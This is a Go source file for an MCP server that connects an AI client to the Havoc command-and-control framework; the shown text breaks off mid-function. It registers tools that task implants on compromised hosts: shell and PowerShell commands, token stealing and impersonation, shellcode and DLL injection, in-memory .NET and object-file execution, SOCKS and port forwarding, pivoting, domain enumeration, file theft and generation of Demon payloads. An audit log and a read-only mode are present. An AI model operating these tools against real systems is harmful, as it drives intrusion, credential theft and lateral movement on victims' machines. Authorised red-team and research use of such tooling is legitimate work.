package mcp

import (
	"bufio"
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"io/fs"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"sync"
	"time"

	// "Havoc/pkg/handlers"
	"Havoc/pkg/operator"
)

// JSON-RPC 2.0 error codes
const (
	ParseError     = -32700
	InvalidRequest = -32600
	MethodNotFound = -32601
	InvalidParams  = -32602
	InternalError  = -32603
)

// Request represents a JSON-RPC 2.0 request.
type Request struct {
	JSONRPC string          `json:"jsonrpc"`
	ID      json.RawMessage `json:"id,omitempty"`
	Method  string          `json:"method"`
	Params  json.RawMessage `json:"params,omitempty"`
}

// Response represents a JSON-RPC 2.0 response.
type Response struct {
	JSONRPC string          `json:"jsonrpc"`
	ID      json.RawMessage `json:"id,omitempty"`
	Result  json.RawMessage `json:"result,omitempty"`
	Error   *ErrorObject    `json:"error,omitempty"`
}

// ErrorObject represents a JSON-RPC 2.0 error object.
type ErrorObject struct {
	Code    int    `json:"code"`
	Message string `json:"message"`
	Data    any    `json:"data,omitempty"`
}

// Notification represents a JSON-RPC 2.0 notification (no ID).
type Notification struct {
	JSONRPC string          `json:"jsonrpc"`
	Method  string          `json:"method"`
	Params  json.RawMessage `json:"params,omitempty"`
}

// Tool represents an MCP tool.
type Tool struct {
	Name        string                                                       `json:"name"`
	Description string                                                       `json:"description"`
	InputSchema json.RawMessage                                              `json:"inputSchema"`
	ReadOnly    bool                                                         `json:"-"`
	Handler     func(ctx context.Context, args json.RawMessage) (any, error) `json:"-"`
}

// Server is the MCP server.
type Server struct {
	opClient   *operator.Client
	cfg        Config
	tools      map[string]*Tool
	mu         sync.RWMutex
	auditLog   *os.File
	auditLogMu sync.Mutex
}

// NewServer creates a new MCP server.
func NewServer(opClient *operator.Client, cfg Config) *Server {
	if cfg.LootRoot == "" {
		cfg.LootRoot = DefaultConfig().LootRoot
	}
	s := &Server{
		opClient: opClient,
		cfg:      cfg,
		tools:    make(map[string]*Tool),
		auditLog: nil,
	}

	s.registerTools()
	return s
}

func (s *Server) registerTools() {
	// Read-only tools (always available)
	s.registerTool(&Tool{
		Name:        "teamserver_status",
		Description: "Get teamserver connection status and profile info",
		InputSchema: mustMarshal(map[string]any{
			"type":       "object",
			"properties": map[string]any{},
		}),
		ReadOnly: true,
		Handler:  s.handleTeamserverStatus,
	})

	s.registerTool(&Tool{
		Name:        "list_sessions",
		Description: "List all active agent sessions",
		InputSchema: mustMarshal(map[string]any{
			"type":       "object",
			"properties": map[string]any{},
		}),
		ReadOnly: true,
		Handler:  s.handleListSessions,
	})

	s.registerTool(&Tool{
		Name:        "get_session",
		Description: "Get details for a specific session",
		InputSchema: mustMarshal(map[string]any{
			"type": "object",
			"properties": map[string]any{
				"session_id": map[string]any{"type": "string"},
			},
			"required": []string{"session_id"},
		}),
		ReadOnly: true,
		Handler:  s.handleGetSession,
	})

	s.registerTool(&Tool{
		Name:        "list_listeners",
		Description: "List all listeners",
		InputSchema: mustMarshal(map[string]any{
			"type":       "object",
			"properties": map[string]any{},
		}),
		ReadOnly: true,
		Handler:  s.handleListListeners,
	})

	s.registerTool(&Tool{
		Name:        "get_output",
		Description: "Read buffered output for a session",
		InputSchema: mustMarshal(map[string]any{
			"type": "object",
			"properties": map[string]any{
				"session_id": map[string]any{"type": "string"},
				"cursor":     map[string]any{"type": "integer", "minimum": 0},
				"max_bytes":  map[string]any{"type": "integer", "minimum": 1, "maximum": 1048576},
			},
			"required": []string{"session_id"},
		}),
		ReadOnly: true,
		Handler:  s.handleGetOutput,
	})

	// Tasking tools (disabled in read-only mode)
	s.registerTool(&Tool{
		Name:        "send_command",
		Description: "Send a curated command to an agent",
		InputSchema: mustMarshal(map[string]any{
			"type": "object",
			"properties": map[string]any{
				"session_id": map[string]any{"type": "string"},
				"command": map[string]any{
					"type": "string",
					"enum": []string{
						"shell", "powershell", "dir", "ls", "cd", "cp", "mv", "move",
						"remove", "rm", "mkdir", "pwd", "cat", "type", "download",
						"upload", "ps", "kill", "sleep", "interactive", "exit", "jobs",
						"config", "luid", "klist", "purge", "ptt", "getprivs",
						"whoami", "ipconfig", "sysinfo", "env",
					},
				},
				"args": map[string]any{"type": "object"},
			},
			"required": []string{"session_id", "command"},
		}),
		ReadOnly: false,
		Handler:  s.handleSendCommand,
	})

	s.registerTool(&Tool{
		Name:        "screenshot",
		Description: "Runs command screenshot and returns task metadata plus a base64 screenshot payload.",
		InputSchema: mustMarshal(map[string]any{
			"type": "object",
			"properties": map[string]any{
				"session_id": map[string]any{"type": "string"},
			},
			"required": []string{"session_id"},
		}),
		ReadOnly: false,
		Handler:  s.handleScreenshot,
	})

	s.registerTool(&Tool{
		Name:        "socks",
		Description: "Runs command socks and returns task metadata and proxy output.",
		InputSchema: mustMarshal(map[string]any{
			"type": "object",
			"properties": map[string]any{
				"session_id": map[string]any{"type": "string"},
				"action":     map[string]any{"type": "string", "enum": []string{"add", "list", "kill", "clear"}},
				"param":      map[string]any{"type": "string"},
			},
			"required": []string{"session_id", "action"},
		}),
		ReadOnly: false,
		Handler:  s.handleSocks,
	})

	s.registerTool(&Tool{
		Name:        "rportfwd",
		Description: "Runs command rportfwd and returns task metadata and forwarding output.",
		InputSchema: mustMarshal(map[string]any{
			"type": "object",
			"properties": map[string]any{
				"session_id": map[string]any{"type": "string"},
				"action":     map[string]any{"type": "string", "enum": []string{"add", "list", "remove", "clear"}},
				"bind_host":  map[string]any{"type": "string"},
				"bind_port":  map[string]any{"type": "integer", "minimum": 1, "maximum": 65535},
				"host":       map[string]any{"type": "string"},
				"port":       map[string]any{"type": "integer", "minimum": 1, "maximum": 65535},
				"socket_id":  map[string]any{"type": "string"},
			},
			"required": []string{"session_id", "action"},
		}),
		ReadOnly: false,
		Handler:  s.handleRportfwd,
	})

	s.registerTool(&Tool{
		Name:        "token",
		Description: "Runs command token and returns task metadata and token-vault output.",
		InputSchema: mustMarshal(map[string]any{
			"type": "object",
			"properties": map[string]any{
				"session_id": map[string]any{"type": "string"},
				"subcommand": map[string]any{"type": "string", "enum": []string{
					"impersonate", "steal", "list", "find", "make", "revert", "remove",
					"clear", "getuid", "privs-list", "privs-get",
				}},
				"token_id":   map[string]any{"type": "string"},
				"process_id": map[string]any{"type": "integer"},
				"handle":     map[string]any{"type": "string"},
				"domain":     map[string]any{"type": "string"},
				"username":   map[string]any{"type": "string"},
				"password":   map[string]any{"type": "string"},
				"logon_type": map[string]any{"type": "string", "enum": []string{
					"LOGON_INTERACTIVE", "LOGON_NETWORK", "LOGON_BATCH", "LOGON_SERVICE",
					"LOGON_UNLOCK", "LOGON_NETWORK_CLEARTEXT", "LOGON_NEW_CREDENTIALS",
				}},
				"privilege": map[string]any{"type": "string"},
			},
			"required": []string{"session_id", "subcommand"},
		}),
		ReadOnly: false,
		Handler:  s.handleToken,
	})

	s.registerTool(&Tool{
		Name:        "shellcode",
		Description: "Runs command shellcode and returns task metadata and injection output.",
		InputSchema: mustMarshal(map[string]any{
			"type": "object",
			"properties": map[string]any{
				"session_id": map[string]any{"type": "string"},
				"action":     map[string]any{"type": "string", "enum": []string{"inject", "spawn", "execute"}},
				"arch":       map[string]any{"type": "string", "enum": []string{"x64", "x86"}},
				"pid":        map[string]any{"type": "integer"},
				"file_path":  map[string]any{"type": "string"},
				"args":       map[string]any{"type": "string"},
			},
			"required": []string{"session_id", "action", "arch", "file_path"},
		}),
		ReadOnly: false,
		Handler:  s.handleShellcode,
	})

	s.registerTool(&Tool{
		Name:        "dotnet",
		Description: "Runs command dotnet and returns task metadata and .NET output.",
		InputSchema: mustMarshal(map[string]any{
			"type": "object",
			"properties": map[string]any{
				"session_id":    map[string]any{"type": "string"},
				"action":        map[string]any{"type": "string", "enum": []string{"inline-execute", "list-versions"}},
				"assembly_path": map[string]any{"type": "string"},
				"args":          map[string]any{"type": "string"},
			},
			"required": []string{"session_id", "action"},
		}),
		ReadOnly: false,
		Handler:  s.handleDotnet,
	})

	s.registerTool(&Tool{
		Name:        "inline_execute",
		Description: "Runs command inline-execute and returns task metadata and object-file output.",
		InputSchema: mustMarshal(map[string]any{
			"type": "object",
			"properties": map[string]any{
				"session_id": map[string]any{"type": "string"},
				"bof_path":   map[string]any{"type": "string"},
				"args":       map[string]any{"type": "string"},
			},
			"required": []string{"session_id", "bof_path"},
		}),
		ReadOnly: false,
		Handler:  s.handleInlineExecute,
	})

	s.registerTool(&Tool{
		Name:        "dll",
		Description: "Runs command dll and returns task metadata and reflective-DLL output.",
		InputSchema: mustMarshal(map[string]any{
			"type": "object",
			"properties": map[string]any{
				"session_id": map[string]any{"type": "string"},
				"action":     map[string]any{"type": "string", "enum": []string{"inject", "spawn"}},
				"pid":        map[string]any{"type": "integer"},
				"file_path":  map[string]any{"type": "string"},
				"args":       map[string]any{"type": "string"},
			},
			"required": []string{"session_id", "action", "file_path"},
		}),
		ReadOnly: false,
		Handler:  s.handleDll,
	})

	s.registerTool(&Tool{
		Name:        "download",
		Description: "Runs command download and returns task metadata plus the completed file path.",
		InputSchema: mustMarshal(map[string]any{
			"type": "object",
			"properties": map[string]any{
				"session_id": map[string]any{"type": "string"},
				"path":       map[string]any{"type": "string"},
			},
			"required": []string{"session_id", "path"},
		}),
		ReadOnly: false,
		Handler:  s.handleDownload,
	})

	s.registerTool(&Tool{
		Name:        "checkin",
		Description: "Runs command checkin and returns task metadata and agent check-in output.",
		InputSchema: mustMarshal(map[string]any{
			"type": "object",
			"properties": map[string]any{
				"session_id": map[string]any{"type": "string"},
			},
			"required": []string{"session_id"},
		}),
		ReadOnly: false,
		Handler:  s.handleCheckin,
	})

	s.registerTool(&Tool{
		Name:        "job",
		Description: "Runs command job and returns task metadata and job-manager output.",
		InputSchema: mustMarshal(map[string]any{
			"type": "object",
			"properties": map[string]any{
				"session_id": map[string]any{"type": "string"},
				"action":     map[string]any{"type": "string", "enum": []string{"list", "suspend", "resume", "kill"}},
				"job_id":     map[string]any{"type": "integer"},
			},
			"required": []string{"session_id", "action"},
		}),
		ReadOnly: false,
		Handler:  s.handleJob,
	})

	s.registerTool(&Tool{
		Name:        "proc",
		Description: "Runs command proc and returns task metadata and process-management output.",
		InputSchema: mustMarshal(map[string]any{
			"type": "object",
			"properties": map[string]any{
				"session_id":   map[string]any{"type": "string"},
				"action":       map[string]any{"type": "string", "enum": []string{"list", "modules", "grep", "create", "blockdll", "kill", "memory"}},
				"pid":          map[string]any{"type": "integer"},
				"process_name": map[string]any{"type": "string"},
				"state":        map[string]any{"type": "string", "enum": []string{"normal", "suspended"}},
				"silent":       map[string]any{"type": "boolean"},
				"no_pipe":      map[string]any{"type": "boolean"},
				"program":      map[string]any{"type": "string"},
				"args":         map[string]any{"type": "string"},
				"blockdll":     map[string]any{"type": "string", "enum": []string{"on", "off"}},
				"protection": map[string]any{"type": "string", "enum": []string{
					"PAGE_NOACCESS", "PAGE_READONLY", "PAGE_READWRITE", "PAGE_WRITECOPY",
					"PAGE_EXECUTE", "PAGE_EXECUTE_READ", "PAGE_EXECUTE_READWRITE",
					"PAGE_EXECUTE_WRITECOPY", "PAGE_GUARD",
				}},
			},
			"required": []string{"session_id", "action"},
		}),
		ReadOnly: false,
		Handler:  s.handleProc,
	})

	s.registerTool(&Tool{
		Name:        "spawn",
		Description: "Spawns a process using the raw proc-create encoding and returns task metadata plus output.",
		InputSchema: mustMarshal(map[string]any{
			"type": "object",
			"properties": map[string]any{
				"session_id": map[string]any{"type": "string"},
				"state":      map[string]any{"type": "string", "enum": []string{"normal", "suspended"}},
				"silent":     map[string]any{"type": "boolean"},
				"no_pipe":    map[string]any{"type": "boolean"},
				"program":    map[string]any{"type": "string"},
				"args":       map[string]any{"type": "string"},
			},
			"required": []string{"session_id", "program"},
		}),
		ReadOnly: false,
		Handler:  s.handleSpawn,
	})

	s.registerTool(&Tool{
		Name:        "transfer",
		Description: "Runs command transfer and returns task metadata and download-transfer output.",
		InputSchema: mustMarshal(map[string]any{
			"type": "object",
			"properties": map[string]any{
				"session_id": map[string]any{"type": "string"},
				"action":     map[string]any{"type": "string", "enum": []string{"list", "stop", "resume", "remove"}},
				"file_id":    map[string]any{"type": "string"},
			},
			"required": []string{"session_id", "action"},
		}),
		ReadOnly: false,
		Handler:  s.handleTransfer,
	})

	s.registerTool(&Tool{
		Name:        "net",
		Description: "Runs command net and returns task metadata and network-enumeration output.",
		InputSchema: mustMarshal(map[string]any{
			"type": "object",
			"properties": map[string]any{
				"session_id": map[string]any{"type": "string"},
				"action":     map[string]any{"type": "string", "enum": []string{"domain", "logons", "sessions", "share", "localgroup", "group", "users"}},
				"target":     map[string]any{"type": "string"},
			},
			"required": []string{"session_id", "action"},
		}),
		ReadOnly: false,
		Handler:  s.handleNet,
	})

	s.registerTool(&Tool{
		Name:        "pivot",
		Description: "Runs command pivot and returns task metadata and pivot output.",
		InputSchema: mustMarshal(map[string]any{
			"type": "object",
			"properties": map[string]any{
				"session_id": map[string]any{"type": "string"},
				"action":     map[string]any{"type": "string", "enum": []string{"list", "connect", "disconnect"}},
				"host":       map[string]any{"type": "string"},
				"address":    map[string]any{"type": "string"},
				"agent_id":   map[string]any{"type": "string"},
			},
			"required": []string{"session_id", "action"},
		}),
		ReadOnly: false,
		Handler:  s.handlePivot,
	})

	s.registerTool(&Tool{
		Name:        "send_raw_command",
		Description: "Send a raw command to an agent (advanced)",
		InputSchema: mustMarshal(map[string]any{
			"type": "object",
			"properties": map[string]any{
				"session_id":   map[string]any{"type": "string"},
				"command_id":   map[string]any{"type": "string"},
				"info":         map[string]any{"type": "object", "additionalProperties": map[string]any{"type": "string"}},
				"command_line": map[string]any{"type": "string"},
			},
			"required": []string{"session_id", "command_id", "info"},
		}),
		ReadOnly: false,
		Handler:  s.handleSendRawCommand,
	})

	s.registerTool(&Tool{
		Name:        "wait_for_output",
		Description: "Wait for new output from a session",
		InputSchema: mustMarshal(map[string]any{
			"type": "object",
			"properties": map[string]any{
				"session_id":      map[string]any{"type": "string"},
				"cursor":          map[string]any{"type": "integer", "minimum": 0},
				"timeout_seconds": map[string]any{"type": "integer", "minimum": 1, "maximum": 60},
			},
			"required": []string{"session_id", "cursor"},
		}),
		ReadOnly: true,
		Handler:  s.handleWaitForOutput,
	})

	s.registerTool(&Tool{
		Name:        "get_task",
		Description: "Get task metadata and output by task ID",
		InputSchema: mustMarshal(map[string]any{
			"type": "object",
			"properties": map[string]any{
				"task_id": map[string]any{"type": "string"},
			},
			"required": []string{"task_id"},
		}),
		ReadOnly: true,
		Handler:  s.handleGetTask,
	})

	// Listener management tools (Phase 4)
	s.registerTool(&Tool{
		Name:        "start_listener",
		Description: "Start a new listener (HTTP/HTTPS/SMB/External)",
		InputSchema: mustMarshal(map[string]any{
			"type": "object",
			"properties": map[string]any{
				"name":     map[string]any{"type": "string"},
				"protocol": map[string]any{"type": "string", "enum": []string{"http", "https", "smb", "external"}},
				"config":   map[string]any{"type": "object", "additionalProperties": true},
			},
			"required": []string{"name", "protocol", "config"},
		}),
		ReadOnly: false,
		Handler:  s.handleStartListener,
	})

	s.registerTool(&Tool{
		Name:        "edit_listener",
		Description: "Edit an existing listener",
		InputSchema: mustMarshal(map[string]any{
			"type": "object",
			"properties": map[string]any{
				"name":   map[string]any{"type": "string"},
				"config": map[string]any{"type": "object", "additionalProperties": true},
			},
			"required": []string{"name", "config"},
		}),
		ReadOnly: false,
		Handler:  s.handleEditListener,
	})

	s.registerTool(&Tool{
		Name:        "remove_listener",
		Description: "Remove a listener",
		InputSchema: mustMarshal(map[string]any{
			"type": "object",
			"properties": map[string]any{
				"name": map[string]any{"type": "string"},
			},
			"required": []string{"name"},
		}),
		ReadOnly: false,
		Handler:  s.handleRemoveListener,
	})

	// Payload generation tool (Phase 5)
	s.registerTool(&Tool{
		Name:        "generate_payload",
		Description: "Generate a payload (Windows EXE, DLL, shellcode, etc.)",
		InputSchema: mustMarshal(map[string]any{
			"type": "object",
			"properties": map[string]any{
				"agent_type": map[string]any{"type": "string", "enum": []string{"Demon"}},
				"listener":   map[string]any{"type": "string"},
				"arch":       map[string]any{"type": "string", "enum": []string{"x64", "x86"}},
				"format": map[string]any{"type": "string", "enum": []string{
					"Windows Exe",
					"Windows Service Exe",
					"Windows Dll",
					"Windows Reflective Dll",
					"Windows Shellcode",
				}},
				"config": map[string]any{"type": "string"},
			},
			"required": []string{"agent_type", "listener", "arch", "format", "config"},
		}),
		ReadOnly: false,
		Handler:  s.handleGeneratePayload,
	})
}

func (s *Server) registerTool(t *Tool) {
	// Check if tool is allowed
	if len(s.cfg.AllowedTools) > 0 && !slices.Contains(s.cfg.AllowedTools, t.Name) {
		return
	}

	// Check read-only
	if s.cfg.ReadOnly && !t.ReadOnly {
		return
	}

	s.mu.Lock()
	s.tools[t.Name] = t
	s.mu.Unlock()
}

func (s *Server) getTool(name string) (*Tool, bool) {
	s.mu.RLock()
	defer s.mu.RUnlock()
	t, ok := s.tools[name]
	return t, ok
}

func (s *Server) listTools() []Tool {
	s.mu.RLock()
	defer s.mu.RUnlock()

	result := make([]Tool, 0, len(s.tools))
	for _, t := range s.tools {
		result = append(result, *t)
	}
	return result
}

// Serve runs the MCP server over stdio.
func (s *Server) Serve(ctx context.Context, in io.Reader, out io.Writer) error {
	// Set up audit log file
	if s.cfg.AuditLog != "" && s.cfg.AuditLog != "stderr" {
		if err := s.openAuditLog(); err != nil {
			return fmt.Errorf("failed to open audit log: %w", err)
		}
		defer s.closeAuditLog()
	}

	scanner := bufio.NewScanner(in)
	encoder := json.NewEncoder(out)

	for scanner.Scan() {
		line := scanner.Bytes()
		if len(line) == 0 {
			continue
		}

		var req Request
		if err := json.Unmarshal(line, &req); err != nil {
			s.writeError(encoder, nil, ParseError, "Parse error", err.Error())
			continue
		}

		// Validate JSON-RPC version
		if req.JSONRPC != "2.0" {
			s.writeError(encoder, req.ID, InvalidRequest, "Invalid Request", "jsonrpc must be '2.0'")
			continue
		}

		// Handle request
		resp := s.handleRequest(ctx, &req)
		if resp != nil {
			if err := encoder.Encode(resp); err != nil {
				return fmt.Errorf("encode response: %w", err)
			}
		}
	}

	if err := scanner.Err(); err != nil {
		return fmt.Errorf("scanner error: %w", err)
	}

	return nil
}

func (s *Server) openAuditLog() error {
	s.auditLogMu.Lock()
	defer s.auditLogMu.Unlock()

	if s.auditLog != nil {
		return nil // Already open
	}

	// Ensure directory exists
	dir := filepath.Dir(s.cfg.AuditLog)
	if err := os.MkdirAll(dir, 0700); err != nil {
		return fmt.Errorf("create audit log directory: %w", err)
	}

	// Open file in append-only mode with restricted permissions (0600)
	file, err := os.OpenFile(s.cfg.AuditLog, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0600)
	if err != nil {
		return fmt.Errorf("open audit log file: %w", err)
	}

	s.auditLog = file
	return nil
}

func (s *Server) closeAuditLog() {
	s.auditLogMu.Lock()
	defer s.auditLogMu.Unlock()

	if s.auditLog != nil {
		if err := s.auditLog.Close(); err != nil {
			fmt.Fprintf(os.Stderr, "mcp: failed to close audit log: %v\n", err)
		}
		s.auditLog = nil
	}
}

func (s *Server) handleRequest(ctx context.Context, req *Request) *Response {
	switch req.Method {
	case "initialize":
		return s.handleInitialize(req)
	case "notifications/initialized":
		// Ignored per spec
		return nil
	case "tools/list":
		return s.handleToolsList(req)
	case "tools/call":
		return s.handleToolsCall(ctx, req)
	case "ping":
		return s.handlePing(req)
	default:
		return s.errorResponse(req.ID, MethodNotFound, "Method not found", req.Method)
	}
}

func (s *Server) handleInitialize(req *Request) *Response {
	var params struct {
		ProtocolVersion string `json:"protocolVersion"`
		Capabilities    struct {
			Tools struct {
				ListChanged bool `json:"listChanged"`
			} `json:"tools"`
		} `json:"capabilities"`
		ClientInfo struct {
			Name    string `json:"name"`
			Version string `json:"version"`
		} `json:"clientInfo"`
	}

	if req.Params != nil {
		if err := json.Unmarshal(req.Params, &params); err != nil {
			return s.errorResponse(req.ID, InvalidParams, "Invalid parameters", err.Error())
		}
	}

	// Accept known protocol versions
	version := params.ProtocolVersion
	if version == "" {
		version = "2025-06-18"
	}

	result := map[string]any{
		"protocolVersion": version,
		"capabilities": map[string]any{
			"tools": map[string]any{
				"listChanged": false,
			},
		},
		"serverInfo": map[string]any{
			"name":    "havoc-mcp",
			"version": "0.1.0",
		},
	}

	return s.successResponse(req.ID, result)
}

func (s *Server) handleToolsList(req *Request) *Response {
	tools := s.listTools()
	// Convert to JSON-serializable format (without Handler)
	type toolDef struct {
		Name        string          `json:"name"`
		Description string          `json:"description"`
		InputSchema json.RawMessage `json:"inputSchema"`
	}

	defs := make([]toolDef, len(tools))
	for i, t := range tools {
		defs[i] = toolDef{
			Name:        t.Name,
			Description: t.Description,
			InputSchema: t.InputSchema,
		}
	}

	return s.successResponse(req.ID, map[string]any{"tools": defs})
}

func (s *Server) handleToolsCall(ctx context.Context, req *Request) *Response {
	var params struct {
		Name      string          `json:"name"`
		Arguments json.RawMessage `json:"arguments"`
	}

	if req.Params == nil {
		return s.errorResponse(req.ID, InvalidParams, "Missing parameters", nil)
	}

	if err := json.Unmarshal(req.Params, &params); err != nil {
		return s.errorResponse(req.ID, InvalidParams, "Invalid parameters", err.Error())
	}

	tool, ok := s.getTool(params.Name)
	if !ok {
		return s.errorResponse(req.ID, MethodNotFound, "Tool not found", params.Name)
	}

	// Audit log - tool call start
	s.auditToolCall(params.Name, params.Arguments, "start", "")

	// Call handler
	result, err := tool.Handler(ctx, params.Arguments)
	if err != nil {
		// Audit log - tool call error
		s.auditToolCall(params.Name, params.Arguments, "error", err.Error())
		return s.errorResponse(req.ID, InternalError, "Tool execution failed", err.Error())
	}

	// Audit log - tool call success
	s.auditToolCall(params.Name, params.Arguments, "success", "")

	// Format result as MCP tool result. The text content must be the JSON
	// representation of the result, not Go's %v map syntax.
	encoded, err := json.Marshal(result)
	if err != nil {
		s.auditToolCall(params.Name, params.Arguments, "error", "failed to encode result: "+err.Error())
		return s.errorResponse(req.ID, InternalError, "Failed to encode tool result", err.Error())
	}

	content := []map[string]any{
		{"type": "text", "text": string(encoded)},
	}

	return s.successResponse(req.ID, map[string]any{
		"content": content,
		"isError": false,
	})
}

func (s *Server) handlePing(req *Request) *Response {
	return s.successResponse(req.ID, map[string]any{})
}

func (s *Server) successResponse(id json.RawMessage, result any) *Response {
	data, err := json.Marshal(result)
	if err != nil {
		return s.errorResponse(id, InternalError, "Failed to encode response", err.Error())
	}
	return &Response{
		JSONRPC: "2.0",
		ID:      id,
		Result:  data,
	}
}

func (s *Server) errorResponse(id json.RawMessage, code int, message string, data any) *Response {
	err := &ErrorObject{
		Code:    code,
		Message: message,
		Data:    data,
	}
	return &Response{
		JSONRPC: "2.0",
		ID:      id,
		Error:   err,
	}
}

func (s *Server) writeError(enc *json.Encoder, id json.RawMessage, code int, message string, data any) {
	resp := s.errorResponse(id, code, message, data)
	if err := enc.Encode(resp); err != nil {
		fmt.Fprintf(os.Stderr, "mcp: failed to write error response: %v\n", err)
	}
}

func (s *Server) auditToolCall(name string, args json.RawMessage, status, errorMsg string) {
	// Get operator username from status
	opStatus := s.opClient.Status()
	user := opStatus.User
	if user == "" {
		user = "unknown"
	}

	// Sanitize arguments for logging (remove sensitive fields)
	sanitizedArgs := sanitizeArgs(args)

	// Build audit entry with precise security-compliant fields
	timestamp := time.Now().Format("2006-01-02 15:04:05")
	entry := fmt.Sprintf("%s [mcp-audit] user=%s tool=%s status=%s args=%s",
		timestamp, user, name, status, string(sanitizedArgs))

	if errorMsg != "" {
		entry += fmt.Sprintf(" error=%q", errorMsg)
	}
	entry += "\n"

	// Write to file if configured
	if s.cfg.AuditLog != "" && s.cfg.AuditLog != "stderr" {
		s.auditLogMu.Lock()
		if s.auditLog != nil {
			if _, err := s.auditLog.WriteString(entry); err != nil {
				fmt.Fprintf(os.Stderr, "mcp: failed to write audit log: %v\n", err)
			}
		}
		s.auditLogMu.Unlock()
	}

	// Also log to stderr for visibility (matches teamserver logger behavior)
	if s.cfg.AuditLog == "stderr" || s.cfg.AuditLog == "" {
		os.Stderr.WriteString(entry)
	}
}

// sanitizeArgs removes sensitive fields from arguments before logging.
// Returns the sanitized JSON as RawMessage.
func sanitizeArgs(args json.RawMessage) json.RawMessage {
	if len(args) == 0 {
		return json.RawMessage("{}")
	}

	var data map[string]any
	if err := json.Unmarshal(args, &data); err != nil {
		// If we can't parse, return empty object to avoid logging raw data
		return json.RawMessage("{}")
	}

	// Fields that should never be logged
	sensitiveKeys := map[string]bool{
		"password":     true,
		"secret":       true,
		"key":          true,
		"token":        true,
		"command_line": true, // May contain sensitive commands
		"config":       true, // Payload config may contain sensitive data
	}

	for key := range data {
		lowerKey := strings.ToLower(key)
		if sensitiveKeys[lowerKey] {
			data[key] = "[REDACTED]"
		}
	}

	sanitized, _ := json.Marshal(data)
	return sanitized
}

func mustMarshal(v any) json.RawMessage {
	data, err := json.Marshal(v)
	if err != nil {
		panic(err)
	}
	return data
}

// Tool handlers

func (s *Server) handleTeamserverStatus(ctx context.Context, args json.RawMessage) (any, error) {
	status := s.opClient.Status()
	return map[string]any{
		"connected":  status.Connected,
		"user":       status.User,
		"server":     status.Server,
		"profile":    status.Profile,
		"last_error": status.LastError,
		"since":      status.Since.Format("2006-01-02 15:04:05"),
	}, nil
}

func (s *Server) handleListSessions(ctx context.Context, args json.RawMessage) (any, error) {
	sessions := s.opClient.Sessions()
	result := make([]map[string]any, len(sessions))
	for i, sess := range sessions {
		result[i] = map[string]any{
			"id":            sess.ID,
			"hostname":      sess.Hostname,
			"username":      sess.Username,
			"domain":        sess.Domain,
			"internal_ip":   sess.InternalIP,
			"external_ip":   sess.ExternalIP,
			"os_version":    sess.OSVersion,
			"os_arch":       sess.OSArch,
			"process_name":  sess.ProcessName,
			"process_path":  sess.ProcessPath,
			"pid":           sess.PID,
			"ppid":          sess.PPID,
			"active":        sess.Active,
			"elevated":      sess.Elevated,
			"sleep_delay":   sess.SleepDelay,
			"sleep_jitter":  sess.SleepJitter,
			"last_call_in":  sess.LastCallIn,
			"first_call_in": sess.FirstCallIn,
		}
	}
	return map[string]any{"sessions": result}, nil
}

func (s *Server) handleGetSession(ctx context.Context, args json.RawMessage) (any, error) {
	var params struct {
		SessionID string `json:"session_id"`
	}
	if err := json.Unmarshal(args, &params); err != nil {
		return nil, err
	}

	sess, ok := s.opClient.Session(params.SessionID)
	if !ok {
		return nil, fmt.Errorf("session not found: %s", params.SessionID)
	}

	return map[string]any{
		"id":            sess.ID,
		"hostname":      sess.Hostname,
		"username":      sess.Username,
		"domain":        sess.Domain,
		"internal_ip":   sess.InternalIP,
		"external_ip":   sess.ExternalIP,
		"os_version":    sess.OSVersion,
		"os_arch":       sess.OSArch,
		"process_name":  sess.ProcessName,
		"process_path":  sess.ProcessPath,
		"pid":           sess.PID,
		"ppid":          sess.PPID,
		"active":        sess.Active,
		"elevated":      sess.Elevated,
		"sleep_delay":   sess.SleepDelay,
		"sleep_jitter":  sess.SleepJitter,
		"last_call_in":  sess.LastCallIn,
		"first_call_in": sess.FirstCallIn,
	}, nil
}

func (s *Server) handleListListeners(ctx context.Context, args json.RawMessage) (any, error) {
	listeners := s.opClient.Listeners()
	result := make([]map[string]any, len(listeners))
	for i, l := range listeners {
		result[i] = map[string]any{
			"name":      l.Name,
			"protocol":  l.Protocol,
			"status":    l.Status,
			"hosts":     l.Hosts,
			"host_bind": l.HostBind,
			"port_bind": l.PortBind,
			"port_conn": l.PortConn,
			"secure":    l.Secure,
		}
	}
	return map[string]any{"listeners": result}, nil
}

func (s *Server) handleGetOutput(ctx context.Context, args json.RawMessage) (any, error) {
	var params struct {
		SessionID string `json:"session_id"`
		Cursor    uint64 `json:"cursor"`
		MaxBytes  int    `json:"max_bytes"`
	}
	if err := json.Unmarshal(args, &params); err != nil {
		return nil, err
	}

	if params.MaxBytes <= 0 {
		params.MaxBytes = s.cfg.MaxOutputBytes
	}
	if params.MaxBytes > 1048576 {
		params.MaxBytes = 1048576
	}

	page := s.opClient.ReadOutput(params.SessionID, params.Cursor, params.MaxBytes)

	events := make([]map[string]any, len(page.Events))
	for i, e := range page.Events {
		events[i] = outputEventMap(e)
	}

	return map[string]any{
		"events":      events,
		"next_cursor": page.NextCursor,
		"truncated":   page.Truncated,
	}, nil
}

func (s *Server) handleWaitForOutput(ctx context.Context, args json.RawMessage) (any, error) {
	var params struct {
		SessionID      string `json:"session_id"`
		Cursor         uint64 `json:"cursor"`
		TimeoutSeconds int    `json:"timeout_seconds"`
	}
	if err := json.Unmarshal(args, &params); err != nil {
		return nil, err
	}

	if params.TimeoutSeconds <= 0 {
		params.TimeoutSeconds = 30
	}
	if params.TimeoutSeconds > 60 {
		params.TimeoutSeconds = 60
	}

	timeout := time.Duration(params.TimeoutSeconds) * time.Second
	page := s.opClient.WaitOutput(ctx, params.SessionID, params.Cursor, timeout)

	events := make([]map[string]any, len(page.Events))
	for i, e := range page.Events {
		events[i] = outputEventMap(e)
	}

	return map[string]any{
		"events":      events,
		"next_cursor": page.NextCursor,
		"truncated":   page.Truncated,
	}, nil
}

func (s *Server) handleGetTask(ctx context.Context, args json.RawMessage) (any, error) {
	var params struct {
		TaskID string `json:"task_id"`
	}
	if err := json.Unmarshal(args, &params); err != nil {
		return nil, err
	}

	task, page, ok := s.opClient.GetTask(params.TaskID)
	if !ok {
		return nil, fmt.Errorf("task not found: %s", params.TaskID)
	}

	events := make([]map[string]any, len(page.Events))
	for i, e := range page.Events {
		events[i] = outputEventMap(e)
	}

	return map[string]any{
		"task": map[string]any{
			"task_id":        task.TaskID,
			"session_id":     task.SessionID,
			"command_id":     task.CommandID,
			"command_line":   task.CommandLine,
			"cursor_at_send": task.CursorAtSend,
